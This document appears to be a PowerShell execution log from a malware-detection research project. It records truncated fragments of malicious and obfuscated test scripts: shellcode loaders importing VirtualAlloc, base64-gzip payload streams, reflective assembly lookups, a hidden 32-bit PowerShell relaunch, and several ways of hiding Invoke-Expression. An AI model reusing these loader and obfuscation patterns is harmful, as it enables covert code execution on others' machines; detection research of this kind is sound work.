"8/6/2026 10:31:09 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1754.ps1","2780"," ('ECXleF = j3y[DllImport(OQv'+'kernel32.dllOQv)'+']public static extern IntPtr Vi'+'rtualAllo'+'c(IntPtr lpAddress, uint dwSize, '+'uint flAllocatio'+'nType, uint flProtect);[DllImport(OQvkernel32.dl"
"8/6/2026 10:31:02 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:31:02 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:31:02 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:31:02 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:31:01 AM","","2334","$leF = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:31:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1754.ps1","19","{( [chAr][inT]$_) }"
"8/6/2026 10:31:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1754.ps1","7986"," .((GET-VAriABLE '*MDr*').NAME[3,11,2]-JoiN'') ( [sTRiNG]::joiN( '', ( '36f108r101I70v32r61O32f39}91r68}108O108Z73v109%112{111Z114}116b40%34%107b101b114b110I101f108r51r50O46Z100O108f108v34O41%93Z112r1"
"8/6/2026 10:30:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:30:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:30:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:30:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:30:53 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1754.ps1","2334","$leF = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:30:45 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:30:45 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:30:45 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:30:45 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:30:45 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1741.ps1","2327","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:30:38 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:30:38 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:30:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:30:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:30:37 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:30:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1741.ps1","2850","iNvoKe-ExPResSIoN ((((""{25}{46}{10}{38}{24}{34}{35}{48}{43}{1}{20}{28}{29}{40}{7}{21}{2}{3}{23}{19}{0}{44}{4}{9}{36}{30}{31}{41}{17}{18}{33}{15}{26}{13}{6}{8}{27}{47}{39}{12}{11}{37}{45}{5}{16}{14}{22"
"8/6/2026 10:30:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:30:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:30:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:30:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:30:29 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:30:29 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1741.ps1","2648",".( $shEllid[1]+$sHEllId[13]+'x') ( (('Q0Ic = aE9[DllImport(fgLkernel32.dll'+'fgL)]public '+'static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[Dll"
"8/6/2026 10:30:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:30:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:30:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:30:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:30:21 AM","","2323"," $c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr "
"8/6/2026 10:30:21 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1741.ps1","18","{([chAr] [iNT]$_)}"
"8/6/2026 10:30:21 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1741.ps1","8046","& ((Get-VaRIaBle '*MDR*').NAmE[3,11,2]-JoIn'')("" $(sET-Item 'vaRIABLE:Ofs'  '' )""+ [StRinG]( '36e99,32l61m32>39f91j68l108e108f73j109e112e111,114,116f40f34e107,101f114l110d101j108d51>50}46e100j108>108f"
"8/6/2026 10:30:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:30:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:30:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:30:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:30:13 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1741.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:30:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:30:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:30:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:30:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:30:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\174.ps1","2327","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:29:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:29:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:29:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:29:57 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\174.ps1","3001","IEx ((((""{11}{37}{7}{40}{64}{35}{30}{27}{2}{65}{10}{50}{58}{41}{44}{46}{8}{56}{59}{32}{31}{38}{15}{19}{51}{6}{18}{66}{0}{71}{13}{48}{62}{54}{12}{52}{24}{3}{61}{26}{42}{47}{9}{34}{72}{29}{60}{33}{57}{7"
"8/6/2026 10:29:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:29:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:29:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:29:49 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:49 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\174.ps1","2769"," .((Gv '*mdr*').Name[3,11,2]-jOIn'') ((('ZjPc = QFq[DllImport(yUFkernel32.dllyUF)]public static extern IntPtr Virtua'+'lAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[Dll"
"8/6/2026 10:29:41 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:29:41 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:29:41 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:29:41 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:29:41 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\174.ps1","23","{( [inT]$_ -as[chaR]) }"
"8/6/2026 10:29:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\174.ps1","7997"," .((gv '*mdR*').nAmE[3,11,2]-jOiN'') (-JOin ( '36q99;32q61s32I39O91;68c108q108~73Z109Z112u111~114s116u40c34~107q101c114Z110O101s108O51q50c46q100I108O108c34I41I93Z112h117I98I108Z105c99Z32h115;116;97u11"
"8/6/2026 10:29:33 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:29:33 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:29:33 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:29:33 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:29:33 AM","C:\TA\project-ta\data_spliting\test_set\malicious\174.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:25 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:29:25 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:29:25 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:29:25 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:29:25 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1733.ps1","2328","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:29:17 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:29:17 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:29:17 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1733.ps1","3079",". ( ([strInG]$VErbOsEPReFerence)[1,3]+'x'-JOiN'')( ((""{18}{63}{37}{41}{72}{13}{56}{35}{20}{14}{9}{58}{50}{53}{4}{49}{69}{71}{46}{59}{26}{51}{65}{10}{0}{61}{1}{19}{43}{55}{67}{34}{36}{25}{3}{64}{17}{54"
"8/6/2026 10:29:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:29:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:29:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:29:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:29:09 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:09 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1733.ps1","2662","(('gA2c = p7X[DllImport(jCrker'+'n'+'el32.dlljCr)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(jCrkernel32.dlljCr)]public s"
"8/6/2026 10:29:01 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:29:01 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:29:01 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:29:01 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:29:01 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:29:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1733.ps1","23","{( [InT]$_ -aS[CHAR]) }"
"8/6/2026 10:29:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1733.ps1","8011","( '36}99u32u61u32%39M91d68O108B108:73B109M112:111O114u116}40!34O107v101M114u110:101!108%51:50v46O100O108:108}34u41M93v112B117!98!108u105%99B32v115%116u97B116}105B99%32O101%120}116O101u114:110u32}73:11"
"8/6/2026 10:28:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:28:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:28:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:28:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:28:53 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1733.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:28:45 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:28:45 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:28:45 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:28:45 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:28:45 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1730.ps1","2327","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:28:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:28:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:28:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:28:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:28:37 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:28:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1730.ps1","2870"," . ((gV '*MDr*').nAmE[3,11,2]-JoiN'') ((((""{22}{44}{28}{33}{2}{3}{12}{40}{1}{21}{18}{43}{15}{42}{30}{23}{14}{24}{17}{46}{16}{13}{39}{8}{41}{47}{10}{29}{32}{27}{11}{37}{0}{34}{7}{36}{45}{19}{5}{25}{48}"
"8/6/2026 10:28:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:28:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:28:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:28:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:28:29 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:28:28 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1730.ps1","2714"," ('v0Sc = XaR[DllImport(mISkernel32.dll'+'mIS)]public static extern IntPtr VirtualAlloc(IntPtr lpAddr'+'ess, uint dwSize, uint flA'+'llocationType, uint flProtect);[Dl'+'lImport(mISkernel32.dllmIS)]'+"
"8/6/2026 10:28:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:28:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:28:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:28:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:28:21 AM","","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:28:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1730.ps1","24","{( [INt]$_ -AS [char]) }"
"8/6/2026 10:28:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1730.ps1","7972"," &( $pshome[4]+$pSHOMe[30]+'x')(-jOIN ( '36Z99t32j61@32j39L91A68L108y108Z73@109j112j111@114@116y40y34L107U101U114L110L101@108U51t50Z46t100Z108@108>34Z41Z93L112y117N98j108@105Z99U32y115@116>97A116j105U"
"8/6/2026 10:28:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:28:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:28:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:28:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:28:12 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1730.ps1","2321","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:28:08 AM","","9","$global:?"
"8/6/2026 10:28:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:28:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:28:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:28:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:28:07 AM","","80","{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }"
"8/6/2026 10:28:07 AM","","519","function sdsfkKgtbg {
	Param ($ebaApCG2f4g, $uGYkJ)		
	$pIuRFP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.d"
"8/6/2026 10:28:07 AM","","2676","function sdsfkKgtbg {
	Param ($ebaApCG2f4g, $uGYkJ)		
	$pIuRFP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.d"
"8/6/2026 10:28:07 AM","","1960","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAEloBVgCA71WbW/aOhT+3En7D9GERKJRApSta6VJ1wnvJRSaEgoMTW7iBBcTZ47TFnb33+8JJCu766befbgRKH55jn38nOf4xE9CV1IeKrEX+6uLQN4GytfXr46GWOC1ohbILUaR"
"8/6/2026 10:28:05 AM","","9","$global:?"
"8/6/2026 10:28:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1727.ps1","2330","if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=Ne`w-obj`ECT System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-no"
"8/6/2026 10:28:00 AM","","9","$global:?"
"8/6/2026 10:28:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:28:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:28:00 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:28:00 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:28:00 AM","","80","{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }"
"8/6/2026 10:28:00 AM","","519","function sdsfkKgtbg {
	Param ($ebaApCG2f4g, $uGYkJ)		
	$pIuRFP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.d"
"8/6/2026 10:28:00 AM","","2676","function sdsfkKgtbg {
	Param ($ebaApCG2f4g, $uGYkJ)		
	$pIuRFP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.d"
"8/6/2026 10:27:59 AM","","1960","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAEloBVgCA71WbW/aOhT+3En7D9GERKJRApSta6VJ1wnvJRSaEgoMTW7iBBcTZ47TFnb33+8JJCu766befbgRKH55jn38nOf4xE9CV1IeKrEX+6uLQN4GytfXr46GWOC1ohbILUaR"
"8/6/2026 10:27:57 AM","","9","$global:?"
"8/6/2026 10:27:57 AM","","2326","if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop "
"8/6/2026 10:27:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1727.ps1","3092"," . ( $eNv:comSpeC[4,24,25]-JOin'') ( (((""{22}{47}{15}{49}{3}{4}{16}{13}{50}{35}{41}{61}{59}{14}{38}{2}{28}{8}{1}{33}{53}{68}{34}{42}{46}{36}{19}{7}{31}{56}{48}{55}{9}{71}{21}{20}{63}{25}{37}{32}{57}{5"
"8/6/2026 10:27:53 AM","","9","$global:?"
"8/6/2026 10:27:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:27:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:27:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:27:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:27:52 AM","","80","{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }"
"8/6/2026 10:27:52 AM","","519","function sdsfkKgtbg {
	Param ($ebaApCG2f4g, $uGYkJ)		
	$pIuRFP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.d"
"8/6/2026 10:27:52 AM","","2676","function sdsfkKgtbg {
	Param ($ebaApCG2f4g, $uGYkJ)		
	$pIuRFP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.d"
"8/6/2026 10:27:51 AM","","1960","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAEloBVgCA71WbW/aOhT+3En7D9GERKJRApSta6VJ1wnvJRSaEgoMTW7iBBcTZ47TFnb33+8JJCu766befbgRKH55jn38nOf4xE9CV1IeKrEX+6uLQN4GytfXr46GWOC1ohbILUaR"
"8/6/2026 10:27:50 AM","","9","$global:?"
"8/6/2026 10:27:50 AM","","2326","if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop "
"8/6/2026 10:27:49 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1727.ps1","2698"," & ((VarIable '*Mdr*').naMe[3,11,2]-join'') (('if([Int'+'Ptr]:'+':Size -eq 4){4Tbb=oLWpowershell.exeoLW}else{4Tbb=4Tbenv:windir+oLWTMKsyswow64TMKWindowsPowerShel'+'lTMKv1.0TMKpowershell'+'.e'+'xeoLW};"
"8/6/2026 10:27:45 AM","","9","$global:?"
"8/6/2026 10:27:45 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:27:45 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:27:45 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:27:45 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:27:44 AM","","80","{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }"
"8/6/2026 10:27:44 AM","","519","function sdsfkKgtbg {
	Param ($ebaApCG2f4g, $uGYkJ)		
	$pIuRFP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.d"
"8/6/2026 10:27:44 AM","","2676","function sdsfkKgtbg {
	Param ($ebaApCG2f4g, $uGYkJ)		
	$pIuRFP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.d"
"8/6/2026 10:27:43 AM","","1960","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAEloBVgCA71WbW/aOhT+3En7D9GERKJRApSta6VJ1wnvJRSaEgoMTW7iBBcTZ47TFnb33+8JJCu766befbgRKH55jn38nOf4xE9CV1IeKrEX+6uLQN4GytfXr46GWOC1ohbILUaR"
"8/6/2026 10:27:42 AM","","9","$global:?"
"8/6/2026 10:27:42 AM","","2329","  if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-no"
